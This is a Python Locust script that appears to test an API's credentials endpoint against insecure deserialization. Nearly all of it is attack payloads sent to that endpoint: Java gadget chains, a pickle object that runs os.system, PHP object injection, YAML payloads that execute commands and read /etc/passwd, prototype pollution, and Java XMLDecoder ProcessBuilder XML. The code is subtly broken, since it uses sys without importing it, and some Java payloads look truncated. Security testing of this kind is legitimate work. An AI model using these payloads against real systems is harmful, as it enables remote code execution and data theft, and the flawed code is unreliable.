import os
import csv
import json
import logging
import uuid
import base64
import pickle
from locust import HttpUser, task, SequentialTaskSet, constant, events

stat_file = open('/tmp/insecure_deserialization_stats.csv', 'w')
log = logging.getLogger(__name__)

for i in ['../../']:
    path = os.path.realpath(os.path.join(os.path.dirname(os.path.realpath(__file__)), i))
    if path not in sys.path:
        sys.path.insert(0, path)

from libs.jsonconfig.jsonconfig import JsonConfig


class InsecureDeserializationAttacks(SequentialTaskSet):
    json = None
    stat_file = None

    @events.init_command_line_parser.add_listener
    def _collect_(parser):
        parser.add_argument("--stat_file", type=str, env_var="LOCUST_MY_ARGUMENT", default="", help="stat file name")
        parser.add_argument("--json", type=str, help="--json=<exact json path>. Not relative path like ~/")
        args = parser.parse_args()
        InsecureDeserializationAttacks.json = JsonConfig(args.json)

    @events.test_start.add_listener
    def _(environment, **kw):
        log.info(f"Custom argument supplied: {environment.parsed_options.stat_file}")
        InsecureDeserializationAttacks.stat_file = environment.parsed_options.stat_file

    @events.request.add_listener
    def my_request_handler(request_type, name, response_time, response_length, response,
                           exception, *args, **kwargs):
        if exception:
            log.info(f"Request to {name} failed with exception {exception}")
        else:
            log.info(f"Successfully made a request to: {name}")
            filename = InsecureDeserializationAttacks.stat_file
            with open(filename, 'a', newline='') as csv_file:
                writer = csv.writer(csv_file)
                writer.writerow([name, request_type, response_time, response_length])

    def on_start(self):
        payload = InsecureDeserializationAttacks.json.payload(api_call="on_start")
        version = InsecureDeserializationAttacks.json.version(api_call="on_start")
        uri = InsecureDeserializationAttacks.json.uri(api_call="on_start")
        response = self.client.post(uri.format(version),
                                    json=payload,
                                    verify=False,
                                    catch_response=True)
        token_json = response.json()
        self.token = token_json["access_token"]
        log.debug("self.token={}".format(self.token))
        return self.token

    @task
    def test_java_deserialization_attacks(self):
        headers = {"Authorization": f"Bearer {self.token}"}

        # Java deserialization payloads (Base64 encoded)
        java_payloads = [
            # Apache Commons Collections gadget chain
            "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IAQG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwxBp8j1b6hwIAAVsADWlUcmFuc2Zvcm1lcnN0ADVbTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyADVbTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcjvNHdJqR1aE8AIAAXB4cAAAAAN0AAtleGVjIHRvdWNocA==",

            # JRMP gadget
            "aced0005737200176a6176612e7574696c2e5072696f72697479517565756594da30b4fb3f82b103000249000473697a654c000a636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b78700000000274001273756e2e7574696c2e636f6c6c656374696f6e732e426c6f636b696e6751756575652443616c6c61626c65497465726174",

            # Spring framework gadget
            "rO0ABXNyADJvcmcuc3ByaW5nZnJhbWV3b3JrLnRyYW5zYWN0aW9uLmpUYS5UcmFuc2FjdGlvblRlbXBsYXRl/////////////////////wMAA0wAFnRyYW5zYWN0aW9uTWFuYWdlclBhdGh0ABJMamF2YS9sYW5nL1N0cmluZzt0ABV0cmFuc2FjdGlvbk1hbmFnZXJOYW1ldAASTGphdmEvbGFuZy9TdHJpbmc=",
        ]

        for java_payload in java_payloads:
            # Try in different fields
            test_fields = ["name", "username", "password"]

            for field in test_fields:
                payload = {
                    "name": "test",
                    "username": "admin",
                    "password": "password",
                    "type": "OS",
                    field: java_payload
                }

                with self.client.post("/api/v3/raw-credentials",
                                      headers=headers,
                                      verify=False,
                                      json=payload,
                                      catch_response=True) as response:

                    if response.status_code == 500:
                        log.warning(f"Java deserialization may have caused error in field '{field}'")
                        response.success()
                    elif response.status_code in [200, 201]:
                        log.info(f"Java deserialization payload processed: {field}")
                        response.success()
                    else:
                        log.info(f"Java deserialization blocked: {response.status_code}")

    @task
    def test_python_pickle_attacks(self):
        headers = {"Authorization": f"Bearer {self.token}"}

        # Python pickle payloads
        try:
            # Create malicious pickle payload
            class RCE:
                def __reduce__(self):
                    import os
                    return (os.system, ('echo "pickle_rce_test" > /tmp/pickle_test.txt',))

            malicious_pickle = pickle.dumps(RCE())
            pickle_b64 = base64.b64encode(malicious_pickle).decode()

            # Simple pickle payload
            simple_pickle = pickle.dumps("malicious_string")
            simple_b64 = base64.b64encode(simple_pickle).decode()

            pickle_payloads = [pickle_b64, simple_b64]

            for pickle_payload in pickle_payloads:
                payload = {
                    "name": f"pickle_test_{uuid.uuid4()}",
                    "username": "admin",
                    "password": "password",
                    "type": "OS",
                    "extraInfo": [
                        {
                            "name": "serialized_data",
                            "value": pickle_payload
                        }
                    ]
                }

                with self.client.post("/api/v3/raw-credentials",
                                      headers=headers,
                                      verify=False,
                                      json=payload,
                                      catch_response=True) as response:

                    if response.status_code == 500:
                        log.warning(f"Python pickle deserialization may have caused error")
                        response.success()
                    elif response.status_code in [200, 201]:
                        log.info(f"Python pickle payload processed")
                        response.success()

        except Exception as e:
            log.info(f"Pickle payload creation failed: {e}")

    @task
    def test_php_deserialization_attacks(self):
        headers = {"Authorization": f"Bearer {self.token}"}

        # PHP serialized object payloads
        php_payloads = [
            # PHP object injection
            'O:8:"stdClass":1:{s:4:"test";s:4:"evil";}',

            # Potential RCE via __destruct
            'O:9:"Exception":7:{s:10:"\0*\0message";s:15:"<?php phpinfo();";s:17:"\0Exception\0string";s:0:"";s:7:"\0*\0code";i:0;s:9:"\0*\0file";s:0:"";s:7:"\0*\0line";i:0;s:16:"\0Exception\0trace";a:0:{}s:19:"\0Exception\0previous";N;}',

            # Array with object
            'a:1:{i:0;O:8:"stdClass":1:{s:4:"prop";s:5:"value";}}',

            # Nested serialized objects
            'O:8:"stdClass":1:{s:4:"data";O:8:"stdClass":1:{s:4:"exec";s:10:"system(ls)";}}',
        ]

        for php_payload in php_payloads:
            payload = {
                "name": f"php_test_{uuid.uuid4()}",
                "username": "admin",
                "password": "password",
                "type": "OS",
                "extraInfo": [
                    {
                        "name": "php_serialized",
                        "value": php_payload
                    }
                ]
            }

            with self.client.post("/api/v3/raw-credentials",
                                  headers=headers,
                                  verify=False,
                                  json=payload,
                                  catch_response=True) as response:

                if response.status_code == 500:
                    log.warning(f"PHP deserialization may have caused error")
                    response.success()
                elif response.status_code in [200, 201]:
                    log.info(f"PHP serialized payload processed")
                    response.success()

    @task
    def test_yaml_deserialization_attacks(self):
        headers = {"Authorization": f"Bearer {self.token}"}

        # YAML deserialization payloads
        yaml_payloads = [
            # Python object instantiation
            "!!python/object/apply:os.system ['echo yaml_rce_test']",

            # Subprocess execution
            "!!python/object/apply:subprocess.check_output [['ls', '-la']]",

            # File read attempt
            "!!python/object/apply:builtins.open ['/etc/passwd']",

            # Eval execution
            "!!python/object/apply:eval ['__import__(\"os\").system(\"whoami\")']",
        ]

        for yaml_payload in yaml_payloads:
            payload = {
                "name": f"yaml_test_{uuid.uuid4()}",
                "username": "admin",
                "password": "password",
                "type": "OS",
                "extraInfo": [
                    {
                        "name": "yaml_config",
                        "value": yaml_payload
                    }
                ]
            }

            with self.client.post("/api/v3/raw-credentials",
                                  headers=headers,
                                  verify=False,
                                  json=payload,
                                  catch_response=True) as response:

                if response.status_code == 500:
                    log.warning(f"YAML deserialization may have caused error")
                    response.success()
                elif response.status_code in [200, 201]:
                    log.info(f"YAML payload processed")
                    response.success()

    @task
    def test_json_deserialization_attacks(self):
        headers = {"Authorization": f"Bearer {self.token}"}

        # JSON-based deserialization attacks
        json_payloads = [
            # Prototype pollution attempt
            {
                "name": "test",
                "username": "admin",
                "password": "password",
                "type": "OS",
                "__proto__": {
                    "admin": True,
                    "role": "administrator"
                }
            },

            # Constructor pollution
            {
                "name": "test",
                "username": "admin",
                "password": "password",
                "type": "OS",
                "constructor": {
                    "prototype": {
                        "admin": True
                    }
                }
            },

            # Function injection attempt
            {
                "name": "test",
                "username": "admin",
                "password": "password",
                "type": "OS",
                "extraInfo": [
                    {
                        "name": "function",
                        "value": "function(){return global.process.mainModule.require('child_process').exec('whoami');}"
                    }
                ]
            }
        ]

        for json_payload in json_payloads:
            with self.client.post("/api/v3/raw-credentials",
                                  headers=headers,
                                  verify=False,
                                  json=json_payload,
                                  catch_response=True) as response:

                if response.status_code == 500:
                    log.warning(f"JSON deserialization may have caused error")
                    response.success()
                elif response.status_code in [200, 201]:
                    log.info(f"JSON deserialization payload processed")
                    response.success()

    @task
    def test_xml_deserialization_attacks(self):
        headers = {
            "Authorization": f"Bearer {self.token}",
            "Content-Type": "application/xml"
        }

        # XML-based deserialization payloads
        xml_payloads = [
            # .NET XmlSerializer gadget
            '''<credential xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="System.Collections.Generic.SortedSet">
                <name>test</name>
                <username>admin</username>
                <password>password</password>
                <type>OS</type>
            </credential>''',

            # Java XMLDecoder
            '''<?xml version="1.0" encoding="UTF-8"?>
            <java version="1.8.0" class="java.beans.XMLDecoder">
                <object class="java.lang.ProcessBuilder">
                    <array class="java.lang.String" length="3">
                        <void index="0"><string>cmd</string></void>
                        <void index="1"><string>/c</string></void>
                        <void index="2"><string>calc</string></void>
                    </array>
                    <void method="start"/>
                </object>
            </java>''',

            # Simple XML with potential issues
            '''<credential>
                <name>test</name>
                <username>admin</username>
                <password>password</password>
                <type>OS</type>
                <object class="java.lang.Runtime">
                    <method name="exec">
                        <string>whoami</string>
                    </method>
                </object>
            </credential>'''
        ]

        for xml_payload in xml_payloads:
            with self.client.post("/api/v3/raw-credentials",
                                  headers=headers,
                                  verify=False,
                                  data=xml_payload,
                                  catch_response=True) as response:

                if response.status_code == 500:
                    log.warning(f"XML deserialization may have caused error")
                    response.success()
                elif response.status_code in [200, 201]:
                    log.info(f"XML deserialization payload processed")
                    response.success()


class InsecureDeserializationUser(HttpUser):
    wait_time = constant(1)
    tasks = [InsecureDeserializationAttacks]
